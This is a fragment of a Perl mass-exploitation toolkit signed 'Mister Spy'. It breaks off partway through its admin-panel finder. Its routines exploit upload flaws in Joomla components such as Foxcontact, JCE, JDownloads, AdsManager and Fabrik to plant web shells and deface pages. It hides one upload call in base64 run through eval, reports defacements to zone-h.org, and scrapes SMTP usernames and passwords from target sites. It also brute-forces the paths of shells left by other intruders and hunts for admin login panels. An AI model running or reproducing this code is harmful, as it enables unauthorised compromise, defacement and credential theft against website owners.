if($checkmasseditproduct =~/Mister Spy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"masseditproduct";
print color('bold white')," ................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $masseditproductup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$masseditproductup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"masseditproduct";
print color('bold white')," ................... ";
print color('bold red'),"NOt VULN\n";
}
}



#       _                           _       ______            
#      | |                         | |     |  ____|           
# | | ___  _ __ ___  _ __ ___ | | __ _| |__  __  ___ __  
#  _   | |/ _ \| '_ ` _ \| '_ ` _ \| |/ _` |  __| \ \/ / '_ \ 
# | |__| | (_) | | | | | | | | | | | | (_| | |____ >  <| |_) |
#  \____/ \___/|_| |_| |_|_| |_| |_|_|\__,_|______/_/\_\ .__/ 
#                                                      | |    
#

################ foxcontact #####################
sub foxcontact(){

@foxvuln= ("components/com_foxcontact/lib/file-uploader.php?cid={}&mid={}&qqfile=/../../_func.php",
"index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id={}?cid={}&mid={}&qqfile=/../../_func.php",
"index.php?option=com_foxcontact&amp;view=loader&amp;type=uploader&amp;owner=module&amp;id={}&cid={}&mid={}&owner=module&id={}&qqfile=/../../_func.php",
"components/com_foxcontact/lib/uploader.php?cid={}&mid={}&qqfile=/../../_func.php");
OUTER: foreach $foxvuln(@foxvuln){
chomp $foxvuln;

my $url = "$site/$foxvuln";

my $shell ="spyx.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$foxup="$site/components/com_foxcontact/_func.php?X=sphinx";
}
my $checkfoxup = $ua->get("$foxup")->content;
if ($checkfoxup =~ /Mister Spy/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Foxcontact";
print color('bold white')," .................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $foxup\n";
open (TEXT, '>>Result_v4/Shell3z.txt');
print TEXT "$foxup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Foxcontact";
print color('bold white')," .................... ";
print color('bold red'),"[Failed]\n";
}
}

############### Jce Img   ####################

sub comjce(){

$ua = LWP::UserAgent->new();
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout(15);


$exploiturl="/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20";

$vulnurl=$site.$exploiturl;
$res = $ua->get($vulnurl)->content;
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[JCE Image Upload] ................... ";


if ($res =~ m/No function call specified!/i){
my $res = $ua->post($vulnurl,
    Content_Type => 'form-data',
    Content => [
        'upload-dir' => './../../',
        'upload-overwrite' => 0,
        'Filedata' => ["tools/spy.gif"],
        'action' => 'upload'
        ]
    )->decoded_content;
if ($res =~ m/"error":false/i){

}else{
    print color('bold red');
print "[Failed]\n ";
    print color('reset');


}

$remote = IO::Socket::INET->new(
        Proto=>'tcp',
        PeerAddr=>"$site",
        PeerPort=>80,
        Timeout=>15
        );
$def= "$site/spy.gif";
$check = $ua->get($def)->status_line;
if ($check =~ /200/){
    open(save, '>>Result_v4/index.txt');
    print save "[Defaced JCE] $def\n";
    close(save);
    print color('bold green');
	print "[Success]\n";
    print color('reset');
zoneh();



}

}
else{
    print color('bold red');
print  "[Failed]\n";
    print color('reset');

}
    }

################ comweblinks #####################
sub comweblinks(){
    $ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);
$ua->cookie_jar(
        HTTP::Cookies->new(
            file => 'mycookies.txt',
            autosave => 1
        )
    );
$urlone ="$site/index.php?option=com_media&view=images&tmpl=component&e_name=jform_description&asset=com_weblinks&author=";
$token = $ua->get($urlone)->content;
if($token =~/<form action="(.*?)" id="uploadForm"/)
{
$url=$1;
}

my $index ="tools/spy.gif";
my $field_name = "Filedata[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$index"] ]
           
            );

$weblinksup= "$site/images/spyx.gif";
$check = $ua->get($weblinksup)->status_line;
if ($check =~ /200/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white')," [Com Weblinks] ";
print color('bold white')," ...................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Picture Uploaded Successfully\n";
print color('bold white'),"  [Link] => $weblinksup\n";
open (TEXT, '>>Result_v4/index.txt');
print TEXT "$weblinksup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Com Weblinks] ";
print color('bold white')," ...................... ";
print color('bold red'),"[Failed]\n";
print color('reset');


}
}

################ jce shell ###################

sub jceshell(){

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Jce Upload Shell] ................... ";


$drupalink = "http://localhost/jce.php";
my $exploit = "$drupalink?url=$site&submit=submit";
my $checkk = $ua->get("$exploit")->content;
if($checkk =~/success/) {

    print color('bold green');
print "[Success]\n";
    print color('reset');
print "$site => User | $admin Password | $pass\n ";
    open(save, '>>Result_v4/Shell3z.txt');
    print save "$site/images/stories/spy3xp.php\n";
    close(save);
    }
else{
    print color('bold red');
print  "[Failed]\n";
    print color('reset');


        }

}
################# Media ######################

sub comediaindex(){

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"[Com Media Index] .................... ";
$tarmedia="$site/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=";

$filemedia = "tools/spy.txt";
$indexmedia="$site/images/spy.txt";
$ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5");
$sorm = $ua->get($tarmedia);
$karza = $sorm->content;
if($karza =~/<form action="(.*?)" id=\"uploadForm\" class=\"form-horizontal\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ || $karza =~ /<form action="(.*?)" id=\"uploadForm\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ )
{
$url = $1;
$url =~ s/&amp;/&/gi;
    my $res = $ua->post($url, Content_Type => 'form-data', Content => [ Filedata => [$filemedia] ]);
 my $check = $ua->get("$indexmedia")->content;
if($check=~/Hacked/ ) {
    print color('bold green');
print "[Sucess]\n";
    print color('reset'); 
        open (TEXT, '>>Result_v4/index.txt');
        print TEXT "[ COM MEDIA Index] => $indexmedia \n";
        close (TEXT);


        $def == $indexmedia;
    zoneh();
        }
    } else{
    print color('bold red');
print "[Failed]\n";
    print color('reset');
        }
}

############### Jdownload ####################

sub comjdowloads($site){

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"[comjdowloads Upload] ................ ";


$file="tools/spy.rar";
$filez="tools/spy.php.php.j";
$jdup= $site . 'index.php?option=com_jdownloads&Itemid=0&view=upload';
$shellpath= $site . '/images/jdownloads/screenshots/spy.php.j';

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $exploit = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"Mister Spy", mail=>"moetazbusiness@gmail.com", filetitle =>"Mister Spy Team", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$file"], pic_upload=>["$filez"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);

if ($exploit->decoded_content =~ /The file was successfully transferred to the server/) {
 

my $checkshell = $ua->get("$shellpath")->content;
if($checkshell =~/Mister Spy/) {
    print color('bold green');
print "[Sucess]\n";
    print color('reset');        open (TEXT, '>>Result_v4/Shell3z.txt');
        print TEXT "[ JDWN SHELL] => $shellpath\n";
        close (TEXT);
}

}else{
    print color('bold red');
print "[Failed]\n";
    print color('reset');
}

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[comjdowloads Index ] ................ ";

$def = $site . '/images/jdownloads/screenshots/spy.html.j';
$filee="tools/spy.rar";
$filezz="tools/spy.html.j";
my $exploitx = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"Mister Spy", mail=>"moetazbusiness@gmail.com", filetitle =>"Mister Spy Team", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$filee"], pic_upload=>["$filezz"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);
if ($exploit->decoded_content =~ /The file was successfully transferred to the server/) {


my $response = $ua->get("$def")->status_line;
if ($response =~ /200/){
    print color('bold green');
print "[Success]\n";
    print color('reset');

        open (TEXT, '>>Result_v4/index.txt');
        print TEXT "[ JDWN Index] => $def\n";
        close (TEXT);

zoneh();
}else{
    print color('bold red');
print "[Failed]\n";
    print color('reset');
        }
}
else{
    print color('bold red');
print "[Failed]\n";
    print color('reset');

}

    }

############### ADS Manger ###################

sub comadsmanegr(){

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"[Com Ads Manger ] .................... ";

my $path = "/index.php?option=com_adsmanager&task=upload&tmpl=component";
if($site !~ /http:\/\//) { $target = "http://$site/"; };
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["def.jpg"], name => "def.html"]);
if ($exploit->decoded_content =~ /def.html/) {
        open(save, '>>Result_v4/index.txt');   
    print save "[ads] $site\n";   
    close(save);

    $def="$site/tmp/plupload/def.html";
my $checkdef = $ua->get("$def")->content;
if($checkdef =~/Mister Spy/) {
    print "[Success]\n ";

    zoneh();
    }
}else{
    print color('bold red');
print "[Failed]\n\n";
    print color('reset');

;
}
}

############### Mds Exploit ##################

sub mods($site){

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"[mod_simplefileupload ] .............. ";

my $gh = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$gh->timeout(10);
$gh->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
   
   
$file="mds_v3.php";
$jdup= $site . '/modules/mod_simplefileuploadv1.3/elements/udd.php';
$shell= $site . '/modules/mod_simplefileuploadv1.3/elements/mds_v3.php';



my $exploit = eval(decode_base64('JGdoLT5wb3N0KCIkamR1cCIsIENvbnRlbnRfVHlwZSA9PiAibXVsdGlwYXJ0L2Zvcm0tZGF0YSIsIENvbnRlbnQgPT4gWyBmaWxlPT5bIiRmaWxlIl0gLCBzdWJtaXQ9PiJVcGxvYWQiIF0pOw=='));


my $check = $gh->get("$shell")->content;
if($check =~/Mister Spy/) {
    print color('bold green');
print "[Success]\n";
    print color('reset');
        open (TEXT, '>>Result_v4/Shell3z.txt');
        print TEXT "$site/cloudxv3.php\n";
        close (TEXT);
		        open (TEXT, '>>Result_v4/index.txt');
		        print TEXT "$site/def.html\n";
        close (TEXT);

		$def =$site .'/def.html';
zoneh();

}
else
{
    print color('bold red');
print "[Failed]\n";
    print color('reset');
}
}
############### ComFabrik  ###################

sub comfabr(){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"[Com Fabrik Shell] ................... ";


$comfab= $site . '/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1';
$def = $site . '/media/spy.txt';
$fabshell = $site . '/media/cloud.php';
##
$indfile="tools/spy.txt";
$shelfile="tools/cloud.php";
##
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $indfab = $ua->post("$comfab", Cookie => "", Content_Type => "form-data", Content => ["userfile" => ["$shelfile"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]);
my $checkfab = $ua->get("$fabshell")->content;
if($checkfab =~/Mister Spy/) {
    print color('bold green');
print  "[Sucess]\n";
    print color('reset');
        open (TEXT, '>>Result_v4/Shell3z.txt');
        print TEXT "$fabshell \n";
        close (TEXT);
}else{
    print color('bold red');
print  "[Failed]\n";
    print color('reset');

    }
}

############### indexcom  ####################

sub indecomfabr(){

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"[Com Fabrik index] ................... ";

    my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
    $ua->timeout(10);
    $ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
    my $indfab = $ua->post("$comfab", Cookie => "", Content_Type => "form-data", Content => ["userfile" => ["$indfile"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]);
my $checkfab = $ua->get("$def")->content;
if($checkfab =~/Mister Spy/) {

    print color('bold green');
print  "[Sucess]\n";
    print color('reset');
zoneh();
            }else{
    print color('bold red');
print  "[Failed]\n";
    print color('reset');

                        }
}


#  ______                       _     
# |___  /                      | |    
#    / / ___  _ __   ___ ______| |__  
#   / / / _ \| '_ \ / _ \______| '_ \ 
#  / /_| (_) | | | |  __/      | | | |
# /_____\___/|_| |_|\___|      |_| |_|
                                                                        
sub zoneh(){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Zone-h Poster] ..................... ";

    open(save, '>>Result_v4/index.txt');
    print save "$def\n";
    close(save);

                                $hack="Mister Spy";
                                $zn="http://zone-h.org/notify/single";
                                $lwp=LWP::UserAgent->new;
                                $res=$lwp  -> post($zn,[
                                'defacer'     => $hack,
                                'domain1'   => $def,
                                'hackmode' => '15',
                                'reason'       => '1',
                                'submit'       => 'Send',
                                ]);
                                if ($res->content =~ /color="red">ERROR<\/font><\/li>/) {
   print color('bold red');
print "[Failed]\n";
    print color('reset');

                                }
                                elsif ($res->content =~ /color="red">OK<\/font><\/li>/) {
   print color('bold green');
print "[Success]\n";
    print color('reset');



                                }
                                else
                                {
   print color('bold red');
print "[Failed]\n";
    print color('reset');
                                }
                            }
							

							
							
							
sub smtpx(){							
$tazzz = "   _____                _____           _            _____           _     _               
  / ____|              / ____|         | |          / ____|         | |   | |              
 | (___  _ __  _   _  | (___  _ __ ___ | |_ _ __   | |  __ _ __ __ _| |__ | |__   ___ _ __ 
  \___ \| '_ \| | | |  \___ \| '_ ` _ \| __| '_ \  | | |_ | '__/ _` | '_ \| '_ \ / _ \ '__|
  ____) | |_) | |_| |  ____) | | | | | | |_| |_) | | |__| | | | (_| | |_) | |_) |  __/ |   
 |_____/| .__/ \__, | |_____/|_| |_| |_|\__| .__/   \_____|_|  \__,_|_.__/|_.__/ \___|_|   
        | |     __/ |                      | |                                             
        |_|    |___/                       |_|                                             
\n";

print $tazzz;
	
smtpcracker();

sub smtpcracker(){
print "List : \n";
$list=<STDIN>;
open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
chomp($_);
$site = $_;
if($site !~ /https:\/\// && $site !~ /http:\/\// ) { $site = "http://$site/"; };
tazx();


}
}
sub tazx(){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (15);
my $cont = $ua->get("$site")->content;

# // Fuck Off kids  Spy always a geniuses   //




        if ($cont =~ /smtpuser = \'(.*?)\';/){
        print "\t SMTP User = $1 \n";
        open (TEXT, '>>spysmtp.txt');
        print TEXT " SMTP INFO\n SMTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtppass = \'(.*?)\';/){
        print "\t SMTP Password = $1 \n";
        open (TEXT, '>>spysmtp.txt');
        print TEXT " SMTP Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtpport = \'(.*?)\';/){
        print "\t SMTP Port = $1 \n";
        open (TEXT, '>>spysmtp.txt');
        print TEXT "SMTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtphost = \'(.*?)\';/){
        print "\t SMTP Host = $1 \n\n";
        open (TEXT, '>>spysmtp.txt');
        print TEXT "SMTP Host = $1\n";
        close (TEXT);
  
}
else{
print  "---------------------->: ";            
print "NOT VULN";
print "\n";

    }

}							
}

sub shellfinder(){
$taz ="  ____             _              _____             
 |  _ \           | |            / ____|            
 | |_) |_ __ _   _| |_ ___ _____| (___  _ __  _   _ 
 |  _ <| '__| | | | __/ _ \______\___ \| '_ \| | | |
 | |_) | |  | |_| | ||  __/      ____) | |_) | |_| |
 |____/|_|   \__,_|\__\___|     |_____/| .__/ \__, |
                                       | |     __/ |
                                       |_|    |___/ v1\n\n";

									  print $taz; 
									   brute();

 
sub brute(){ 
print "List : \n";
$list=<STDIN>;
open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
chomp($_);
$site = $_;
if($site !~ /https:\/\// && $site !~ /http:\/\// ) { $site = "http://$site/"; };
brutespy();
}
}
sub brutespy($site){


	

 
 
@path = ('wso.php','css/1/jou.php','FARES.php','fares.php','WSO.php','dz.php','w.php','wp-content/plugins/akismet/akismet.php','images/stories/w.php','w.php','shell.php','cpanel.php','cpn.php','sql.php','mysql.php','config.php','configuration.php','madspot.php','Cgishell.pl','killer.php','changeall.php','2.php','Sh3ll.php','dz0.php','dam.php','user.php','dom.php','whmcs.php','r00t.php','1.php','a.php','r0k.php','abc.php','egy.php','syrian_shell.php','xxx.php','settings.php','tmp.php','cyber.php','c99.php','r57.php','404.php','gaza.php','1.php','d4rk.php','index1.php','nkr.php','xd.php','M4r0c.php','Dz.php','sniper.php','ksa.php','v4team.php','offline.php','priv8.php','911.php','madspotshell.php','c100.php','sym.php','cp.php','tmp/cpn.php','tmp/w.php','tmp/r57.php','tmp/king.php','tmp/sok.php','tmp/ss.php','tmp/as.php','tmp/dz.php','tmp/r1z.php','tmp/whmcs.php','tmp/root.php','tmp/r00t.php','templates/beez/index.php','templates/beez/beez.php','templates/rhuk_milkyway/index.php','tmp/uploads.php','tmp/upload.php','tmp/sa.php','sa.php','readme.php','tmp/readme.php','wp.zip'.'wp-content/plugins/disqus-comment-system/disqus.php',
'd0mains.php','wp-content/plugins/akismet/akismet.php','madspotshell.php','info.php','egyshell.php','Sym.php','c22.php','c100.php',
'wp-content/plugins/akismet/admin.php#','configuration.php','g.php','wp-content/plugins/google-sitemap-generator/sitemap-core.php#',
'wp-content/plugins/akismet/widget.php#','xx.pl','ls.php','Cpanel.php','k.php','zone-h.php','tmp/user.php','tmp/Sym.php','cp.php',
'tmp/madspotshell.php','tmp/root.php','tmp/whmcs.php','tmp/index.php','tmp/2.php','tmp/dz.php','tmp/cpn.php',
'tmp/changeall.php','tmp/Cgishell.pl','tmp/sql.php','0day.php','tmp/admin.php','cliente/downloads/h4xor.php',
'whmcs/downloads/dz.php','L3b.php','d.php','tmp/d.php','tmp/L3b.php','wp-content/plugins/akismet/admin.php',
'templates/rhuk_milkyway/index.php','templates/beez/index.php','sado.php','admin1.php','upload.php','up.php','vb.zip','vb.rar',
'admin2.asp','uploads.php','sa.php','sysadmins/','admin1/','sniper.php','administration/Sym.php','images/Sym.php',
'/r57.php','/wp-content/plugins/disqus-comment-system/disqus.php','gzaa_spysl','sql-new.php','/shell.php','/sa.php','/admin.php',
'/sa2.php','/2.php','/gaza.php','/up.php','/upload.php','/uploads.php','/templates/beez/index.php','shell.php','/amad.php',
'/t00.php','/dz.php','/site.rar','/Black.php','/site.tar.gz','/home.zip','/home.rar','/home.tar','/home.tar.gz',
'/forum.zip','/forum.rar','/forum.tar','/forum.tar.gz','/test.txt','/ftp.txt','/user.txt','/site.txt','/error_log','/error',
'/cpanel','/awstats','/site.sql','/vb.sql','/forum.sql','r00t-s3c.php','c.php','/backup.sql','/back.sql','/data.sql','wp.rar/',
'wp-content/plugins/disqus-comment-system/disqus.php','asp.aspx','/templates/beez/index.php','tmp/vaga.php',
'tmp/killer.php','whmcs.php','abuhlail.php','tmp/killer.php','tmp/domaine.pl','tmp/domaine.php','useradmin/',
'tmp/d0maine.php','d0maine.php','tmp/sql.php','X.php','123.php','m.php','b.php','up.php','tmp/dz1.php','dz1.php','forum.zip','Symlink.php','Symlink.pl',
'forum.rar','joomla.zip','joomla.rar','wp.php','buck.sql','sysadmin.php','images/c99.php', 'xd.php', 'c100.php',
'spy.aspx','xd.php','tmp/xd.php','sym/root/home/','billing/killer.php','tmp/upload.php','tmp/admin.php',
'Server.php','tmp/uploads.php','tmp/up.php','Server/','wp-admin/c99.php','tmp/priv8.php','priv8.php','cgi.pl/',
'tmp/cgi.pl','downloads/dom.php','templates/ja-helio-farsi/index.php','webadmin.html','admins.php',
'/wp-content/plugins/count-per-day/js/yc/d00.php','bluff.php','king.jeen','admins/','admins.asp','admins.php','wp.zip','/wp-content/plugins/disqus-comment-system/WSO.php',);
 
foreach $myshell(@path){
 
$shellzspy = $site.'/'.$myshell;
$req = HTTP::Request->new(GET=>$shellzspy);
$useragent = LWP::UserAgent->new();
 
$response = $useragent->request($req);
 
if ($response->is_success){
print "Shell Found Ya Spy : $shellzspy\n";
 open(save, '>>ShellbruteSpy.txt');
    print save "$shellzspy\n";
	    close(save);

}else{
print "Failed Ya Spy : $myshell\n";
}
}
}
}



sub adminfinder(){
                                                            

print"\n";
print "\t mm   mmmmm  m    m mmmmm  mm   m     mmmmmm  mmmmm  mm   m mmmmm    mmmmm  mmmmmm \n";
print "\t mm   m    m mm  mm   m    mm   m     mm        m    mm   m m     m  m      m     m\n";
print "\tm  m  m    m m mm m   m    m mm m     mmmmmm    m    m mm m m     m  mmmmm  mmmmmm \n";
print "\tmmmm  m    m m    m   m    m  m m     mm        m    m  m m m     m  m      m     m\n";
print "\tm  m  mmmmm  m    m mmmmm  m   mm     mm      mmmmm  m   mm mmmmm    mmmmm  m     m\n";
print "\n";

print"\n";
print "\t-------------------------------------------------\n";
print "\t[--]                ADMIN FINDER             [--]\n";
print "\t[--]          ------------------------       [--]\n";
print "\t[--]           (C)oded By Mohamed Nour       [--]\n";
print "\t[--]          ------------------------       [--]\n";
print "\t[--]        Greats To All Muslims Hackers    [--]\n";
print "\t-------------------------------------------------\n";
print "\n";

        print " Enter Target\n Example: www.example.com\n: ";
        $site=<STDIN>;
        chomp $site;

        print "\n";
        print "-> Save Results ? y (yes) /n (no) ";
        $save=<STDIN>;
        chomp $save;

        print "\n";
        print " Target source: \n\n1 = html\n 2 = asp\n 3 = aspx\n 4 = cfm\n 5 = js\n 6 = cgi\n 7 = brf\n 8 = Intense\n: ";
        $code=<STDIN>;
        chomp($code);

        if ( $site !~ /^http:/ ) {
        $site = 'http://' . $site;
        }
        if ( $site !~ /\/$/ ) {
        $site = $site . '/';
        }
        print "\n";

        print "-> Target: $site\n";
        print "-> Site source code: $code\n";
        print "-> Searching admin panel...\n\n\n";

        if($code eq "2"){

        @path1=('admin/','user/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
        'memberadmin/','administratorlogin/','adm/','account.asp','admin/account.asp','admin/index.asp','admin/login.asp','admin/admin.asp',
        'admin_area/admin.asp','admin_area/login.asp','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
        'admin_area/admin.html','admin_area/login.html','admin_area/index.html','admin_area/index.asp','bb-admin/index.asp','bb-admin/login.asp','bb-admin/admin.asp',
        'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','admin/controlpanel.html','admin.html','admin/cp.html','cp.html',
        'administrator/index.html','administrator/login.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html','moderator.html',
        'moderator/login.html','moderator/admin.html','account.html','controlpanel.html','admincontrol.html','admin_login.html','panel-administracion/login.html',
        'admin/home.asp','admin/controlpanel.asp','admin.asp','pages/admin/admin-login.asp','admin/admin-login.asp','admin-login.asp','admin/cp.asp','cp.asp',
        'administrator/account.asp','administrator.asp','acceso.asp','login.asp','modelsearch/login.asp','moderator.asp','moderator/login.asp','administrator/login.asp',
        'moderator/admin.asp','controlpanel.asp','admin/account.html','adminpanel.html','webadmin.html','pages/admin/admin-login.html','admin/admin-login.html',
        'webadmin/index.html','webadmin/admin.html','webadmin/login.html','user.asp','user.html','admincp/index.asp','admincp/login.asp','admincp/index.html',
        'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','adminarea/index.html','adminarea/admin.html','adminarea/login.html',
        'panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admin/admin_login.html',
        'admincontrol/login.html','adm/index.html','adm.html','admincontrol.asp','admin/account.asp','adminpanel.asp','webadmin.asp','webadmin/index.asp',
        'webadmin/admin.asp','webadmin/login.asp','admin/admin_login.asp','admin_login.asp','panel-administracion/login.asp','adminLogin.asp',
        'admin/adminLogin.asp','home.asp','admin.asp','adminarea/index.asp','adminarea/admin.asp','adminarea/login.asp','admin-login.html',
        'panel-administracion/index.asp','panel-administracion/admin.asp','modelsearch/index.asp','modelsearch/admin.asp','administrator/index.asp',
        'admincontrol/login.asp','adm/admloginuser.asp','admloginuser.asp','admin2.asp','admin2/login.asp','admin2/index.asp','adm/index.asp',
        'adm.asp','affiliate.asp','adm_auth.asp','memberadmin.asp','administratorlogin.asp','siteadmin/login.asp','siteadmin/index.asp','siteadmin/login.html'
        );

        foreach $ways(@path1){

        $final=$site.$ways;

        my $req=HTTP::Request->new(GET=>$final);
        my $ua=LWP::UserAgent->new();
        $ua->timeout(30);
        my $response=$ua->request($req);

        if($response->content =~ /Username/ ||
        $response->content =~ /Password/ ||
        $response->content =~ /username/ ||
        $response->content =~ /password/ ||
        $response->content =~ /USERNAME/ ||
        $response->content =~ /PASSWORD/ ||
        $response->content =~ /Username/ ||
        $response->content =~ /Wachtwoord/ ||
        $response->content =~ /Senha/ ||
        $response->content =~ /senha/ ||
        $response->content =~ /Personal/ ||
        $response->content =~ /Usuario/ ||
        $response->content =~ /Clave/ ||
        $response->content =~ /Usager/ ||
        $response->content =~ /usager/ ||
        $response->content =~ /Sing/ ||
        $response->content =~ /passe/ ||
        $response->content =~ /P\/W/ || 
        $response->content =~ /Admin Password/
        ){
        print " \n [+] Found -> $final\n\n";

        if ($save eq "y"){
        print "Save stored\n";
        open (MYFILE, '>>med.txt');
        print MYFILE " \n $final\n";
        close (MYFILE); 
        }
        if ($save eq "n"){
        print "Save NOT stored\n"; }
        }else{
        print "[-] Not Found <- $final\n";
        }
        }
        }

        if($code eq "1"){

        @path2=('admin/','administrator/','user/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
        'memberadmin/','administratorlogin/','adm/','admin/account.php','admin/index.php','admin/login.php','admin/admin.php','admin/account.php',
        'admin_area/admin.php','admin_area/login.php','siteadmin/login.php','siteadmin/index.php','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
        'admin_area/index.php','bb-admin/index.php','bb-admin/login.php','bb-admin/admin.php','admin/home.php','admin_area/login.html','admin_area/index.html',
        'admin/controlpanel.php','admin.php','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
        'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
        'admin/cp.php','cp.php','administrator/index.php','administrator/login.php','nsw/admin/login.php','webadmin/login.php','admin/admin_login.php','admin_login.php',
        'administrator/account.php','administrator.php','admin_area/admin.html','pages/admin/admin-login.php','admin/admin-login.php','admin-login.php',
        'bb-admin/index.html','bb-admin/login.html','acceso.php','bb-admin/admin.html','admin/home.html','login.php','modelsearch/login.php','moderator.php','moderator/login.php',
        'moderator/admin.php','account.php','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.php','admincontrol.php',
